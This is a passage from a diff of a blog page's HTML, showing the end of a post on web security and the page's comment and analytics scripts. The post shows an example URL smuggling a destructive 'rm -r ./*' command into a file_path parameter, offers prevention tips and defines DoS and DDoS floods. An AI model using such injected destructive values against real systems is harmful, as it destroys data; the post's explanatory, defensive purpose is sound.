-		const title = body.getElementsByTagName('h1')[0];
-		if (title) {
-			document.title = title.innerText;
-		}
-	};
-	if (body) {
-		changeComments();
-		initComments();
-	}
-</script>
-<script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v9.0" nonce="BSCiWiHI"></script>
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0SEZ9KRGY7"></script>
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<script>
-	window.dataLayer = window.dataLayer || [];
-	function gtag(){dataLayer.push(arguments);}
-	gtag('js', new Date());
-  
-	gtag('config', 'G-0SEZ9KRGY7');
-  </script>
-</html>
+</code></pre><p>If some one input an URL like:</p><p><code>www.example.com/gzip?file_path=file.txt\rm -r ./*</code></p><p>It may be a disaster.</p><h3 id="how%20to%20prevent">How to prevent</h3><p>There are some tips:</p><ol><li><p>use prepared statements instead of building dynamic queries using string concatenation.</p></li><li><p>Validate inputs to detect malicious values.</p></li><li><p>To minimize the potential damage of a successful injection attack, do not assign DBA or admin type access rights to your application accounts. Similarly minimize the privileges of the operating system account that the database process runs under.</p></li></ol><h2 id="dos%20attack">DoS Attack</h2><p>In computing, a denial-of-service attack (DoS attack) is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.</p><p>includes:</p><ol><li><p>SYN Flood</p></li><li><p>ICMP Flood</p></li><li><p>UDP Flood</p></li></ol><p>Compared to DoS attack, A distributed denial-of-service (DDoS) attack occurs when multiple systems flood the bandwidth or resources of a targeted system, usually one or more web servers. Such an attack is often the result of multiple compromised systems (for example, a botnet) flooding the targeted system with traffic.</p></div></div></article></div></div><div id="reminder" style="display:none">Facebook Comments Service is unavailable</div></div></div></div></body><script>const checkFacebookAvailable=()=>new Promise((e,t)=>{const o=new Image;o.src="https://www.facebook.com/images/facebook.png",o.onerror=e=>t(e),o.onload=()=>e(),o.style.display="none",body.append(o),setTimeout(()=>t(),5e3)}),body=document.getElementsByClassName("markdown-body")[0],initComments=()=>{["/","/blog/index.html","/blog/code.html","/blog/leetcode.html","/blog/essay.html","/blog/about.html"].includes(window.location.pathname)||checkFacebookAvailable().then(()=>{const e=document.createElement("div");e.id="fb-root",e.className="post-comments";const t=document.createElement("div");t.className="fb-comments",t.setAttribute("data-href",window.location.href),t.setAttribute("data-numposts","5"),t.setAttribute("data-width","100%"),e.appendChild(t),body.appendChild(e)}).catch(()=>{const e=document.createElement("div");e.className="reminder",e.innerText="Facebook Comments Service is unavailable",body.appendChild(e)})},changeComments=()=>{var e=body.getElementsByTagName("h1")[0];e&&(document.title=e.innerText)};body&&(changeComments(),initComments())</script><script async defer="defer" crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v9.0" nonce="BSCiWiHI"></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-0SEZ9KRGY7"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-0SEZ9KRGY7")</script></html>
